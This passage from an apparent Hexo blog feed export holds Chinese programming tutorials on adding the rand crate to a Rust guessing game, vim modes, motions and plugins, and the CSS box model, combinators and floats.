id="引入crate实现更多功能">引入Crate实现更多功能</h2><p><code>Crate</code>是一个Rust代码包，是Rust在编译时最小的代码单位，它有两种形式，<code>二进制Crate</code>和<code>库Crate</code>：</p><p><code>二进制Crate</code>是一个可执行的程序，比如我们写的<code>一个简单的Rust程序</code>。它们必须要一个<code>main函数</code>来确定程序的入口；</p><p><code>库Crate</code>与其他编程语言中的<code>library</code>概念一致，包含了可以被其他程序使用的代码，它们提供了一些诸如函数之类的东西，使得其他项目能够使用。它们并不能自执行。</p><hr><p>上面我们介绍了<code>Crate</code>，下面我们要用到一个外部的<code>库Crate</code>来完善我们的程序。</p><p><code>一个简单的Rust程序</code>编写了一个让用户输入，然后程序输出用户的输入的程序，从<code>println!</code>的内容我们可以看出我们并不是想做出一个这么简单的程序，我们是想让用户来猜我们的神秘数字。</p><p>为了生成一个随机的神秘数字，我们需要用到随机数，Rust标准库中尚未包含随机数的功能，但是我们可以引入包含随机数功能的<code>rand</code>库Crate。</p><p>我们需要去修改<em>Cargo.toml</em>文件，引入一个<code>rand</code>引用，现在我们将下面一行添加到<code>[dependencies]</code>下：</p><figure class="highlight toml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">rand</span> = <span class="string">&quot;0.8.3&quot;</span></span><br></pre></td></tr></table></figure><p>现在我们不修改任何代码，构建项目，我们会发现Cargo帮我们下载了<code>rand</code>和它依赖的一系列库Crate，Cargo会帮我们检测需要新增的Crate和我们是否修改了代码，并帮我完成下载与构建。</p><p>在<em>Cargo.toml</em>中的依赖版本信息，并不是指定某一个版本，而是一个区间——一个大于等于0.8.3且小于0.9.0的版本。</p><p>为了我们的构建结果是<strong>可以被任何人复刻</strong>的，<em>Cargo.lock</em>文件会帮助每个人的Cargo只会使用指定的依赖版本，除非手动去指定其他版本。我们会将<em>Cargo.lock</em>纳入版本控制中，以保证每个人都可以复刻这个构建结果。</p><p>在<strong>确实</strong>需要更新Crate的版本时，我们还可以通过<code>Cargo update</code>忽视<em>Cargo.lock</em>文件，并重新计算符合<em>Cargo.toml</em>声明的最新版本，将其更新且写入到<em>Cargo.lock</em>文件中。</p><hr><p>让我们开始使用<code>rand</code>来生成一个随机数字，修改我们的代码：</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> std::io;</span><br><span class="line"><span class="keyword">use</span> rand::Rng;</span><br><span class="line"></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;Guess the number!&quot;</span>);</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">secret_number</span> = rand::<span class="title function_ invoke__">thread_rng</span>().<span class="title function_ invoke__">gen_range</span>(<span class="number">1</span>..=<span class="number">100</span>);</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;The secret number is: &#123;&#125;&quot;</span>, secret_number);</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;Please input your guess.&quot;</span>);</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">guess</span> = String::<span class="title function_ invoke__">new</span>();</span><br><span class="line">    io::<span class="title function_ invoke__">stdin</span>()</span><br><span class="line">        .<span class="title function_ invoke__">read_line</span>(&amp;<span class="keyword">mut</span> guess)</span><br><span class="line">        .<span class="title function_ invoke__">expect</span>(<span class="string">&quot;Failed to read line&quot;</span>);</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;You guessed: &#123;guess&#125;&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们依旧是从上往下看我们新增的代码：</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> rand::Rng;</span><br></pre></td></tr></table></figure><p>这里导入了属于rand包里的一个<code>trait</code>——<code>Rng</code>。<code>trait</code>概念类似于其他语言中的接口，里面会定义很多方法。</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="variable">secret_number</span> = rand::<span class="title function_ invoke__">thread_rng</span>().<span class="title function_ invoke__">gen_range</span>(<span class="number">1</span>..=<span class="number">100</span>);</span><br></pre></td></tr></table></figure><p>这里调用了<code>rand::thread_rng()</code>函数，提供</p>]]></content>
      
      
      <categories>
          
          <category> Rust </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Rust </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vim自用使用指南</title>
      <link href="/2022/11/18/vim%E8%87%AA%E7%94%A8%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/"/>
      <url>/2022/11/18/vim%E8%87%AA%E7%94%A8%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/</url>
      
        <content type="html"><![CDATA[<h2 id="vim模式">vim模式</h2><p>vim主要分为几种模式：<code>普通、命令、插入、可视</code></p><p>其中普通模式是vim启动时默认的模式，非普通模式之间的切换，需要回到普通模式才能进行切换。</p><ul><li><p>普通模式 --&gt; 插入模式：通过<code>i、a、o</code>等进入</p><p><code>i</code>在光标前插入<code>I</code>在行首插入</p><p><code>o</code>在下一行插入<code>O</code>在上一行插入</p><p><code>a</code>在光标后插入<code>A</code>在行尾插入</p></li><li><p>插入模式 --&gt; 普通模式：通过<code>ESC</code>退出插入模式</p><p>由于<code>ESC</code>键较远，往往的我们会映射一些键作为<code>ESC</code>，例如<code>j j</code>、<code>CapsLock</code>等，这个可以根据个人喜好来进行映射</p></li><li><p>普通模式 --&gt; 可视模式：通过<code>v</code>进入</p></li><li><p>可视模式 --&gt; 普通模式：通过<code>ESC</code>或者再按一边<code>v</code>退出</p></li><li><p>普通模式 --&gt; 命令模式：通过<code>:</code>进入</p></li><li><p>命令模式 --&gt; 普通模式：命令以回车结束运行，或者通过<code>ESC</code>退出</p></li></ul><h2 id="光标移动">光标移动</h2><p>vim的光标移动均是在普通模式下移动的</p><p>以<code>字符</code>为单位（类似方向键）的光标移动是使用<code>hjkl</code>进行移动</p><p><img src="https://image.icewindy.cn/202211181323643.png" alt="image-20221118132303565"></p><p>以<code>单词</code>为单位的移动</p><ul><li><code>w</code>(word)跳到下一个单词的开头</li><li><code>b</code>(begin)跳到本单词或上一个单词开头</li><li><code>e</code>(end)跳到本单词或下一个单词的结尾</li><li><code>ge</code>跳到上一个单词的结尾</li></ul><p><img src="https://image.icewindy.cn/202211181342981.png" alt="image-20221118134249940"></p><p>以<code>行</code>为单位的移动</p><ul><li><code>0</code>跳到行首</li><li><code>^</code>跳到行首开始的第一个非空字符</li><li><code>$</code>跳到行尾</li><li><code>gg</code>跳到第一行</li><li><code>G</code>跳到最后一行</li></ul><p><code>跳转</code>到同一行下一个指定字符<code>&#123;char&#125;</code>为<strong>一个</strong>字符</p><ul><li><code>f&#123;char&#125;</code>光标跳到下个<code>&#123;char&#125;</code></li><li><code>F&#123;char&#125;</code>光标跳到上个<code>&#123;char&#125;</code></li><li><code>t&#123;char&#125;</code>光标跳到下个<code>&#123;char&#125;</code>前一个字符的位置 //不常用</li><li><code>T&#123;char&#125;</code>光标跳到上个<code>&#123;char&#125;</code>的后一个字符的位置 //不常用</li><li><code>;</code>重复上次跳转操作</li><li><code>,</code>反向查找上次的查找命令</li></ul><h2 id="操作符与动作">操作符与动作</h2><p>操作符也是在普通模式下进行使用。</p><p><code>操作符</code>是在告诉vim我们要干什么</p><p>主要有四个操作符：</p><ul><li><p><code>d</code>(delete)删除</p><p><code>dd</code>删除一行 <code>ndd</code>删除n行，n为数字</p></li><li><p><code>c</code>(change)修改（删除并进入插入模式）</p><p><code>cc</code>删除一行并进入插入模式 <code>ncc</code>删除n行并进入插入模式，n为数字</p></li><li><p><code>y</code>(yank)复制</p><p><code>yy</code>复制一行</p></li><li><p><code>v</code>(visual)选中并进入<code>VISUAL</code>(可视)模式</p></li></ul><p><code>动作</code>是告诉vim我们要怎么做，在使用操作符后，我们在的字符处的光标会变成半高的符号，接下来我们加上<code>动作</code>，注意：再键入一次的<code>d</code>也是一个动作</p><p>动作同样是有<code>i</code>和<code>a</code>两个，它们实际上代表的意思是<code>inner</code>和<code>around</code></p><p><img src="https://image.icewindy.cn/202211190123728.png" alt="image-20221119012302660"></p><p>它们主要的区别是<code>包含(i)与不包含(a)两边的符号</code></p><p>一些<strong>常见</strong>的<code>动作motion</code></p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">iw  :  当前单词</span><br><span class="line">aw  :  当前单词及一个空格</span><br><span class="line">iW  :  当前字符串</span><br><span class="line">aW  :  当前字符串及一个空格</span><br><span class="line">is  :  当前句子</span><br><span class="line">as  :  当前句子及一个空格</span><br><span class="line">ip  :  当前段落</span><br><span class="line">ap  :  当前段落及一个空行</span><br></pre></td></tr></table></figure><p>以<code>d</code>(delete)操作符常用的示例有</p><ul><li><code>diw</code>删除当前单词</li><li><code>di( / dib</code>删除当前小括号内的所有内容 注：<code>b是(的替代</code></li><li><code>da&#123; / daB</code>删除当前包括大括号在内的所有内容 注：<code>B是&#123;的替代</code></li><li><code>df&#123;char&#125;</code>删除当前直到{char}处的内容</li><li><code>d^ / d$</code>删除当前直到开头(^) / 结尾处($)的内容</li><li><code>die</code>删除整个文件的内容</li><li><code>dit</code>删除一个HTML标签内的全部内容</li></ul><p>一些额外的补充</p><ul><li><code>p</code>(paste)粘贴</li><li><code>u</code>(undo)撤回一个操作符+动作</li></ul><p>上面讲的主要是<code>d、c、y</code>三个操作符，这三个操作符比较相似，接下来我们说<code>v</code></p><p><code>v</code>操作符是进入一个选择的模式，可以快速进入选择模式，进入后可以在后面添加我们的动作，如<code>d</code>删除选中的，<code>iw</code>选中一个单词等等</p><h2 id="大小写转换">大小写转换</h2><p>大小写转换比较简单</p><ul><li><code>~</code>将光标下的字母改变大小写</li><li><code>&#123;n&#125;~</code>将光标位置开始的{n}个字母改变大小写</li><li><code>g~~</code>改变当前行字母的大小写</li><li><code>gUU</code>将当前行的字母改成大写</li><li><code>guu</code>将当前行的字母改成小写</li><li><code>gUiw(gUaw)</code>将光标下的单词改成大写</li><li><code>guiw(guaw)</code>将光标下的单词改成小写</li></ul><p>大小写转换也可以配合<code>v</code>操作符一起使用，在<code>v</code>操作符选中后，再使用<code>U</code>转换为大写，或者使用<code>u</code>转换为小写</p><h2 id="开发tips">开发Tips</h2><ul><li><p><code>gd</code>(goto definition)查看函数实现</p></li><li><p><code>gh</code>(goto hover)类似于鼠标悬浮查看的效果</p></li><li><p><code>gt</code>往后跳转标签页<code>gT</code>往前跳转标签页<code>&#123;n&#125;gt</code>跳转到第{n}个标签页</p></li><li><p><code>ctrl+0</code>跳转到资源管理器侧边栏，其他数字代表不同页面</p><p><code>space</code>展开文件夹、打开文件</p></li></ul><h2 id="插件">插件</h2><h3 id="easymotion">Easymotion</h3><p><code>easymotion</code>是vim的一个插件，在vscode的vim插件默认自带了这个插件</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">&quot;vim.easymotion&quot;</span><span class="punctuation">:</span> <span class="keyword">true</span></span><br></pre></td></tr></table></figure><p>通过这个来开启，在默认给出的配置文件，该插件是启用的</p><p>这个插件增加了<strong>快速跳转</strong>的功能，通过<code>&lt;leader&gt;</code>加上一些动作来完成操作，在vscode的vim的默认配置文件中，<code>&lt;leader&gt;</code>的默认指定为<code>&lt;space&gt;</code></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">&quot;vim.leader&quot;</span><span class="punctuation">:</span> <span class="string">&quot;s&quot;</span></span><br></pre></td></tr></table></figure><p>我们通过这个可以修改<code>&lt;leader&gt;</code>使用的按键，使用快速跳转模式后，都会出现类似的界面</p><img src="https://image.icewindy.cn/202211191904810.png" alt="image-20221119190436775" style="zoom:50%;" /><p>以上示例是在使用<code>&lt;leader&gt;&lt;leader&gt;b</code>出现的界面，我们按下我们想跳转位置的有颜色的字母即可跳转到对应位置</p><p>它的具体用法有以下几种</p><ul><li><p><strong>前后位置跳转</strong></p><p><code>&lt;leader&gt;&lt;leader&gt;w</code>(word)当前光标<strong>后面</strong>位置的单词开头</p><p><code>&lt;leader&gt;&lt;leader&gt;b</code>(back)当前光标<strong>前面</strong>位置的单词开头</p></li><li><p><strong>搜索跳转</strong></p><p><code>&lt;leader&gt;&lt;leader&gt;s&#123;char&#125;</code>(search)搜索全部{char}的位置</p><p><code>&lt;leader&gt;&lt;leader&gt;f&#123;char&#125;</code>搜索当前光标<strong>后面</strong>全部{char}的位置</p><p><code>&lt;leader&gt;&lt;leader&gt;F&#123;char&#125;</code>搜索当前光标<strong>前面</strong>全部{char}的位置</p></li></ul><p>还有很多种用法，可以前往官方提供的文档进行查看</p><p><strong>在实际使用中</strong>，<code>&lt;leader&gt;&lt;leader&gt;w/b</code>已经涵盖了大部分场景，几乎用不上其他用法</p><h3 id="vim-surround">vim-surround</h3><p>这个插件的主要作用是对含括类符号（<code>&#123;&#125;、（）、&quot;&quot;等</code>）添加了动作 <code>s</code>–&gt;<code>surround</code>(环绕)</p><ul><li><p><code>ds&#123;char&#125;</code>删除两边的{char}</p></li><li><p><code>cs&#123;char1&#125;&#123;char2&#125;</code>将两边的{char1}替换为{char2}</p></li><li><p><code>ys&#123;motion&#125;&#123;char&#125;</code>在动作{motion}选中的部分两端添加{char}</p></li><li><p><code>S&#123;char&#125;</code>在v模式下用{char}括起来选中的</p></li><li><p><code>gs&#123;char&#125;</code>在v模式下用{char}括起来选中的，括号内文本做新一行</p><p>例：</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Hello world!` =&gt;</span><br><span class="line">`Hello &#123;`</span><br><span class="line">  `world`</span><br><span class="line">`&#125;!</span><br></pre></td></tr></table></figure></li></ul><h2 id="建议参考文档-视频">建议参考文档、视频</h2><p><a href="https://github.com/ahrencode/Miscellaneous/blob/master/vim-cheatsheet.pdf">https://github.com/ahrencode/Miscellaneous/blob/master/vim-cheatsheet.pdf</a></p><p><a href="https://www.bilibili.com/video/BV1z541177Jy/">指尖飞舞：vscode + vim 高效开发（系列视频）_哔哩哔哩_bilibili</a></p>]]></content>
      
      
      <categories>
          
          <category> 实用技能 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Web开发基础（5）：盒模型</title>
      <link href="/2022/11/17/Web%E5%BC%80%E5%8F%91%E5%9F%BA%E7%A1%80%EF%BC%885%EF%BC%89%EF%BC%9A%E7%9B%92%E6%A8%A1%E5%9E%8B/"/>
      <url>/2022/11/17/Web%E5%BC%80%E5%8F%91%E5%9F%BA%E7%A1%80%EF%BC%885%EF%BC%89%EF%BC%9A%E7%9B%92%E6%A8%A1%E5%9E%8B/</url>
      
        <content type="html"><![CDATA[<h2 id="盒子模型">盒子模型</h2><h3 id="基本概念">基本概念</h3><p>所有的HTML元素都可以看作如下图的盒子</p><p><img src="https://image.icewindy.cn/202211160154006.png" alt="image-20221116015359980"></p><p>margin:外边距border:边框padding:内边距</p><p>CSS盒模型本身是一个盒子，封装HTML元素</p><p>它包括了四个属性，<strong>外边距</strong>、<strong>边框</strong>、<strong>内边距</strong>、<strong>内容</strong>，通过设定盒子的四个属性，我们做到布局与设计网页</p><p>当我们指定一个元素CSS的宽度width和高度heigh属性的时候，我们设定的是<strong>内容</strong>部分的宽度和高度。一个完整的元素的，应当还<strong>包括了内边距，边框和外边距</strong></p><p>因此，一个元素的<strong>宽度的计算公式</strong>应该是</p><p><code>宽度 + 左内边距 + 右内边距 + 左边框 + 右边框 + 左外边距 + 右外边距</code></p><p>而一个元素的<strong>高度的计算公式</strong>为</p><p><code>高度 + 顶部内边距 + 底部内边距 + 上边框 + 下边框 + 上外边距 + 下外边距</code></p><h3 id="边框border">边框border</h3><p><code>border</code>这个属性实际上是<code>border-width</code>、<code>border-style</code>、<code>border-color</code>的简写属性，即<code>粗细、样式、颜色</code>三个属性</p><p>粗细的设置就是使用<code>px、rem</code>等等用于粗细上的值来设定边框粗细</p><p>样式的值可以参考<a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/border-style">border-style - CSS（层叠样式表） | MDN (mozilla.org)</a>中的表格，在简写状态下，边框只能四边均为一种样式</p><p>颜色的值可以使用颜色名字(red)、RGB值(rgb(255,0,0))、指定的16进制值(#ff0000)</p><p><strong>单独设置各边：</strong></p><p>上述的三个值均可以单独一行设置，可以指定边进行变化</p><p>它们指定上下左右的方式为<code>border-边-属性</code></p><p>属性对应的便是<code>width</code>、<code>style</code>、<code>color</code></p><p>边的可以有</p><ul><li>top - 上边</li><li>right - 右边</li><li>bottom - 下边</li><li>left - 左边</li></ul><p>它们均有简写的方式，可以具有1-4个值</p><ul><li>一个值时，作用于<code>所有边框</code></li><li>两个值时，依次作用于<code>上下边</code>、<code>左右边</code></li><li>三个值时，依次作用于<code>上边</code>、<code>左右边</code>、<code>下边</code></li><li>四个值时，依次作用于<code>上边</code>、<code>右边</code>、<code>下边</code>、<code>左边</code>，即顺时针</li></ul><h3 id="内边距padding-外边距margin">内边距padding 外边距margin</h3><p><img src="https://image.icewindy.cn/202211171815667.png" alt="image-20221117181527620"></p><p>内边距和外边距跟边框很相似，同样具有上下左右，也同样遵循简写的方式</p><ul><li>一个值时，作用于<code>所有边框</code></li><li>两个值时，依次作用于<code>上下边</code>、<code>左右边</code></li><li>三个值时，依次作用于<code>上边</code>、<code>左右边</code>、<code>下边</code></li><li>四个值时，依次作用于<code>上边</code>、<code>右边</code>、<code>下边</code>、<code>左边</code>，即顺时针</li></ul><p>通过外边距，我们可以实现<code>居中</code>的效果：</p><p>外边距可以设定为auto值，这样就可以做到居中的效果</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">margin</span>: <span class="number">0</span> auto</span><br></pre></td></tr></table></figure><p>上面css语句的意思是讲上下外边距设置为0，左右边距设置为居中</p>]]></content>
      
      
      <categories>
          
          <category> Web开发 </category>
          
          <category> CSS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web三板斧 </tag>
            
            <tag> CSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Web开发基础（4）：层次选择器(组合器)、浮动</title>
      <link href="/2022/11/12/Web%E5%BC%80%E5%8F%91%E5%9F%BA%E7%A1%80%EF%BC%884%EF%BC%89%EF%BC%9A%E5%B1%82%E6%AC%A1%E9%80%89%E6%8B%A9%E5%99%A8(%E7%BB%84%E5%90%88%E5%99%A8)%E3%80%81%E6%B5%AE%E5%8A%A8/"/>
      <url>/2022/11/12/Web%E5%BC%80%E5%8F%91%E5%9F%BA%E7%A1%80%EF%BC%884%EF%BC%89%EF%BC%9A%E5%B1%82%E6%AC%A1%E9%80%89%E6%8B%A9%E5%99%A8(%E7%BB%84%E5%90%88%E5%99%A8)%E3%80%81%E6%B5%AE%E5%8A%A8/</url>
      
        <content type="html"><![CDATA[<h2 id="层次选择器-组合器">层次选择器  /  组合器</h2><p>除了基础选择器，我们还可以用层级选择器，或者叫组合器</p><p>由于HTML文档大体上呈现一种层次的结构：<code>html文档 --&gt; body --&gt; 各级标签...</code></p><p>我们就可以利用这种层次的关系来对HTML文档格式化</p><p>示例文档：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">span</span>&gt;</span>s1<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>p1<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>p2<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>p3<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h3</span>&gt;</span>h3<span class="tag">&lt;/<span class="name">h3</span>&gt;</span>h3&gt;</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">span</span>&gt;</span>s2<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span>一<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span>二<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span>三<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span>四<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p>初始样式：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">* &#123;</span><br><span class="line">    <span class="attribute">margin</span>: <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">padding</span>: <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="后代组合器">后代组合器</h3><p><code> &quot; &quot;</code>（空格）组合器选择前一个元素的后代元素。语法<code>A B</code>，将匹配位于A元素之内任意位置的B元素</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">div</span> <span class="selector-tag">span</span> &#123;</span><br><span class="line">    <span class="attribute">background-color</span>: <span class="number">#9999cc</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://image.icewindy.cn/202211171526773.png" alt="image-20221117152654747"></p><h3 id="直接后代组合器">直接后代组合器</h3><p><code>&gt;</code>组合器选择前一个元素的<code>直接后代</code>元素。语法<code>A &gt; B</code>，将仅选择位于A次级的B元素</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">div</span> &gt; <span class="selector-tag">span</span> &#123;</span><br><span class="line">    <span class="attribute">background-color</span>: <span class="number">#9999cc</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://image.icewindy.cn/202211171527018.png" alt="image-20221117152713996"></p><h3 id="一般兄弟组合器">一般兄弟组合器</h3><p><code>~</code>组合器选择后一个元素在前一个元素后面的任意位置，并拥有同一父元素。语法<code>A ~ B</code>，将选择在同一父元素下，A元素后的所有B元素</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">span</span> ~ <span class="selector-tag">h3</span> &#123;</span><br><span class="line">    <span class="attribute">background-color</span>: <span class="number">#9999cc</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://image.icewindy.cn/202211171527825.png" alt="image-20221117152726797"></p><h3 id="紧邻兄弟组合器">紧邻兄弟组合器</h3><p><code>+</code>组合器选择相邻元素，并拥有同一父元素。语法<code>A + B</code>，将选择同一父元素下，紧邻A的B元素</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">span</span> + <span class="selector-tag">h3</span> &#123;</span><br><span class="line">    <span class="attribute">background-color</span>: <span class="number">#9999cc</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://image.icewindy.cn/202211171527246.png" alt="image-20221117152737210"></p><h2 id="浮动-float">浮动 float</h2><p><strong>参考文章：</strong></p><p><a href="https://www.cnblogs.com/iyangyuan/archive/2013/03/27/2983813.html">经验分享：CSS浮动(float,clear)通俗讲解 - 杨元 - 博客园 (cnblogs.com)</a></p><p>float可以键入的值</p><table><thead><tr><th>值</th><th>描述</th></tr></thead><tbody><tr><td>left</td><td>元素向左浮动</td></tr><tr><td>right</td><td>元素向右浮动</td></tr><tr><td>none</td><td>默认值。元素不浮动</td></tr><tr><td>inherit</td><td>从父元素继承float的值</td></tr></tbody></table><h3 id="浮动的理解">浮动的理解</h3><p>div为块级元素，在默认情况下，div会在页面独占一行，自上而下的排列，也就是文档的<strong>标准流</strong></p><p><img src="https://image.icewindy.cn/202211151810667.png" alt="image-20221115181012615"></p><p>如上，我们发现box3、box4虽然看起来可以在一行内放下，但是box4依旧不会排在box3后面，因为标准流中的div元素会在页面中独立一行</p><p>如果我们需要在一行内显示多个div元素来达到布局的效果，那么标准流很明显无法满足这个要求，这里我们就需要用到<strong>浮动</strong></p><p><strong>浮动可以理解为让某个div元素脱离标准流，漂浮在标准流之上，和标准流不是一个层次</strong></p><p>假如我们这时候让box2<strong>向左浮动（float:left）</strong>，会出现这样的情况</p><p><img src="https://image.icewindy.cn/202211151846159.png" alt="image-20221115184611117"></p><p>box3被box2挡住了一部分。因为box2<strong>脱离了标准流</strong>，而box1、box3、box4依然存在标准流中，因此box3、box4自动向上移动，到达了box2原本所在的位置，形成新的标准流</p><p>如果我们将box2<strong>向右浮动（float:right）</strong>，就会出现这种效果</p><p><img src="https://image.icewindy.cn/202211151851581.png" alt="image-20221115185103550"></p><p>很显然验证了我们上面的说法。</p><p>如果我们将多个盒子都进行浮动，那出现的效果会是怎么样的呢？</p><p>我们将box2、box3都向左浮动：</p><p><img src="https://image.icewindy.cn/202211152002728.png" alt="image-20221115200224687"></p><p>box3接在了box2后面，box4上移到了box1下面与box1形成新的标准流。</p><p>如果我们尝试不将相邻的两个box都设置为浮动，会出现什么情况？将box2和box4都设置为向左浮动，会出现这种情况：</p><p><img src="https://image.icewindy.cn/202211152057181.png" alt="image-20221115205730142"></p><p>box4没有上移与box2相接，接在了box3的<strong>下面</strong>，我们再来看看将box2和box4设置为向右浮动：</p><p><img src="https://image.icewindy.cn/202211152058413.png" alt="image-20221115205852383"></p><p>得到了上面的图的分离版本，因此我们可以得到一个<strong>结论</strong>：</p><blockquote><p>假如某个div元素A是浮动的，如果A元素上一个元素也是浮动的，那么A元素会跟随在上一个元素的后边(如果一行放不下这两个元素，那么A元素会被挤到下一行)；如果A元素上一个元素是标准流中的元素，那么A的相对垂直位置不会改变，也就是说A的顶部总是和上一个元素的底部对齐。</p><p>div的顺序是HTML代码中div的顺序决定的。</p><p>靠近页面边缘的一端是前，远离页面边缘的一端是后。</p></blockquote><p>为了更清晰明了，我将其分了一下点</p><ul><li><p>A为浮动的div元素</p></li><li><p>A的上一个div元素B是浮动，则A会<strong>跟随C后</strong></p></li><li><p>A的上一个div元素C是标准流中的元素，则A<strong>顶部与C的底部在同一平面</strong></p></li><li><p><strong>div的顺序</strong>是由div在<strong>HTML文档中顺序</strong>决定</p></li><li><p><strong>跟随的顺序</strong>是根据距离网页边缘判断，<strong>靠近网页边缘为前，远离网页边缘为后</strong></p><p><img src="https://image.icewindy.cn/202211152114278.png" alt="image-20221115211406244"></p></li></ul><h3 id="清除浮动">清除浮动</h3><p>通过上面的内容，我们可以简单理解为，在标准流中，元素是竖向排列的，在浮动中，元素是横向排列的</p><p>而<strong>清除浮动</strong>可以理解为<strong>打破横向排列</strong></p><p>清除浮动的属性是<code>clear</code></p><p>clear可以填入的属性有</p><table><thead><tr><th>值</th><th>描述</th></tr></thead><tbody><tr><td>none</td><td>默认值，不清除浮动</td></tr><tr><td>left</td><td>不允许左边有浮动对象</td></tr><tr><td>right</td><td>不允许右边有浮动对象</td></tr><tr><td>both</td><td>不允许左右边有浮动对象</td></tr></tbody></table><p>对于清除浮动这个属性，有一个<strong>非常重要的特性</strong>：</p><p><strong>这个属性只能影响使用清除元素的本身，不能影响其他元素</strong></p><p>如何理解这句话呢？</p><p><img src="https://image.icewindy.cn/202211160107384.png" 